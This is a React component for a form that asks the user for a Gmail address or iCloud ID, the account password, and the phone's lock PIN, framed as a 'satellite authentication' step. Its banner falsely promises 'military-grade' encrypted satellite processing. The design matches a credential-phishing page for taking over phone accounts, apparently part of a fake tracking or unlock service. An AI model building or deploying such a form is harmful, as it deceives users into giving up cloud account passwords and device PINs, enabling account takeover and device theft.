import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { Key, Eye, EyeOff, ShieldCheck, Lock } from "lucide-react";
import { useState } from "react";
import { Platform } from "@/lib/device-data";
import { motion } from "framer-motion";

interface UserIdentifierProps {
  platform: Platform;
  identifier: string;
  password: string;
  lockCode: string;
  onIdentifierChange: (identifier: string) => void;
  onPasswordChange: (password: string) => void;
  onLockCodeChange: (lockCode: string) => void;
  onAuthenticate: () => void;
  isVisible: boolean;
}

export function UserIdentifier({ 
  platform, 
  identifier,
  password,
  lockCode,
  onIdentifierChange,
  onPasswordChange,
  onLockCodeChange,
  onAuthenticate, 
  isVisible 
}: UserIdentifierProps) {
  const [showPassword, setShowPassword] = useState(false);
  
  if (!isVisible || !platform) return null;

  const isAndroid = platform === 'android';
  const labelText = isAndroid ? 'Gmail Address' : 'iCloud ID';
  const placeholder = isAndroid ? 'Enter your Gmail address' : 'Enter your iCloud ID';

  const isFormValid = identifier.trim() && password.trim() && lockCode.trim();

  return (
    <div className="max-w-2xl mx-auto">
      <div className="text-center mb-10">
        <h2 className="text-3xl font-bold mb-4">Account Authentication</h2>
        <p className="text-slate-400">Provide your device credentials to establish a secure satellite link.</p>
      </div>

      <div className="grid gap-6">
        <div className="space-y-6 bg-white/[0.02] border border-white/5 rounded-[2.5rem] p-8 lg:p-10">
          <div className="space-y-4">
            <div className="space-y-2">
              <Label className="text-xs font-bold uppercase tracking-widest text-slate-500 ml-1">{labelText}</Label>
              <div className="relative">
                <Input
                  type="email"
                  value={identifier}
                  onChange={(e) => onIdentifierChange(e.target.value)}
                  placeholder={placeholder}
                  className="h-14 bg-white/5 border-white/10 rounded-2xl pl-12 text-lg focus:ring-primary focus:border-primary"
                />
                <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 w-5 h-5" />
              </div>
            </div>

            <div className="space-y-2">
              <Label className="text-xs font-bold uppercase tracking-widest text-slate-500 ml-1">Account Password</Label>
              <div className="relative">
                <Input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => onPasswordChange(e.target.value)}
                  placeholder="Enter your account password"
                  className="h-14 bg-white/5 border-white/10 rounded-2xl pl-12 pr-14 text-lg focus:ring-primary focus:border-primary"
                />
                <Lock className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 w-5 h-5" />
                <Button
                  type="button"
                  variant="ghost"
                  size="icon"
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-white hover:bg-white/5 rounded-xl"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </Button>
              </div>
            </div>

            <div className="space-y-2">
              <Label className="text-xs font-bold uppercase tracking-widest text-slate-500 ml-1">Phone Lock Code</Label>
              <div className="relative">
                <Input
                  type="password"
                  value={lockCode}
                  onChange={(e) => onLockCodeChange(e.target.value)}
                  placeholder="Enter your phone's unlock code/PIN"
                  className="h-14 bg-white/5 border-white/10 rounded-2xl pl-12 text-lg focus:ring-primary focus:border-primary"
                  maxLength={10}
                />
                <Key className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 w-5 h-5" />
              </div>
            </div>
          </div>

          <div className="bg-primary/5 border border-primary/20 rounded-2xl p-6 flex items-start space-x-4">
            <div className="w-10 h-10 bg-primary/20 rounded-xl flex items-center justify-center text-primary shrink-0">
              <ShieldCheck size={24} />
            </div>
            <div>
              <h4 className="font-bold text-sm mb-1">Encrypted Transmission</h4>
              <p className="text-xs text-slate-400 leading-relaxed">
                Your credentials are encrypted using AES-256 military-grade standards and processed through a secure VPC for direct satellite authentication.
              </p>
            </div>
          </div>

          <Button 
            onClick={onAuthenticate}
            disabled={!isFormValid}
            size="lg"
            className="w-full h-14 rounded-2xl bg-primary hover:bg-primary/90 font-bold text-lg shadow-xl shadow-primary/20 transition-all active:scale-[0.98]"
          >
            Begin Satellite Authentication
          </Button>
        </div>
      </div>
    </div>
  );
}
